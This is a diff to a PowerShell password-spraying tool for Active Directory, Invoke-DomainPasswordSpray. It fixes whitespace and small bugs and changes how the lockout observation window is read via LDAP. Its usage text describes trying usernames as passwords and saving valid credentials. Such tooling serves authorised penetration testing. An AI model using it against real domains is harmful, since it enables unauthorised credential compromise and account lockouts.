@@ -43,7 +43,7 @@ function Invoke-DomainPasswordSpray{
     Forces the spray to continue and doesn't prompt for confirmation.
 
     .PARAMETER UsernameAsPassword
-    
+
     For each user, will try that user's name as their password
 
     .EXAMPLE
@@ -65,7 +65,7 @@ function Invoke-DomainPasswordSpray{
     .EXAMPLE
 
     C:\PS> Invoke-DomainPasswordSpray -UsernameAsPassword -OutFile valid-creds.txt
-    
+
     Description
     -----------
     This command will automatically generate a list of users from the current user's domain and attempt to authenticate as each user by using their username as their password. Any valid credentials will be saved to valid-creds.txt
@@ -101,13 +101,13 @@ function Invoke-DomainPasswordSpray{
      $Force,
 
      [Parameter(Position = 7, Mandatory = $false)]
-     [switch]     
+     [switch]
      $UsernameAsPassword,
 
      [Parameter(Position = 8, Mandatory = $false)]
      [int]
      $Delay=0,
-     
+
      [Parameter(Position = 9, Mandatory = $false)]
      $Jitter=0
 
@@ -176,12 +176,12 @@ function Invoke-DomainPasswordSpray{
     }
 
 
-    if ($Passwords.count > 1)
+    if ($Passwords.count -gt 1)
     {
         Write-Host -ForegroundColor Yellow "[*] WARNING - Be very careful not to lock out accounts with the password list option!"
     }
 
-    $observation_window = Get-ObservationWindow
+    $observation_window = Get-ObservationWindow $CurrentDomain
 
     Write-Host -ForegroundColor Yellow "[*] The domain password policy observation window is set to $observation_window minutes."
     Write-Host "[*] Setting a $observation_window minute wait in between sprays."
@@ -226,7 +226,7 @@ function Invoke-DomainPasswordSpray{
             }
         }
     }
-    
+
     Write-Host -ForegroundColor Yellow "[*] Password spraying is complete"
     if ($OutFile -ne "")
     {
@@ -374,7 +374,7 @@ function Get-DomainUserList
         }
     }
 
-    $observation_window = Get-ObservationWindow
+    $observation_window = Get-ObservationWindow $CurrentDomain
 
     # Generate a userlist from the domain
     # Selecting the lowest account lockout threshold in the domain to avoid
@@ -418,7 +418,7 @@ function Get-DomainUserList
     $UserSearcher.PropertiesToLoad.add("samaccountname") > $Null
     $UserSearcher.PropertiesToLoad.add("lockouttime") > $Null
     $UserSearcher.PropertiesToLoad.add("badpwdcount") > $Null
-    $UserSearcher.PropertiesToLoad.add("badpasswordtime") > $Nulll
+    $UserSearcher.PropertiesToLoad.add("badpasswordtime") > $Null
 
     #Write-Host $UserSearcher.filter
 
@@ -531,16 +531,11 @@ function Invoke-SpraySinglePassword
 
 }
 
-function Get-ObservationWindow()
+function Get-ObservationWindow($DomainEntry)
 {
     # Get account lockout observation window to avoid running more than 1
     # password spray per observation window.
-    $command = "cmd.exe /C net accounts /domain"
-    $net_accounts_results = Invoke-Expression -Command:$command
-    $stripped_policy = ($net_accounts_results | Where-Object {$_ -like "*Lockout Observation Window*"})
-    $stripped_split_a, $stripped_split_b = $stripped_policy.split(':',2)
-    $observation_window_no_spaces = $stripped_split_b -Replace '\s+',""
-    [int]$observation_window = [convert]::ToInt32($observation_window_no_spaces, 10)
+    $lockObservationWindow_attr = $DomainEntry.Properties['lockoutObservationWindow']
+    $observation_window = $DomainEntry.ConvertLargeIntegerToInt64($lockObservationWindow_attr.Value) / -600000000
     return $observation_window
 }
-
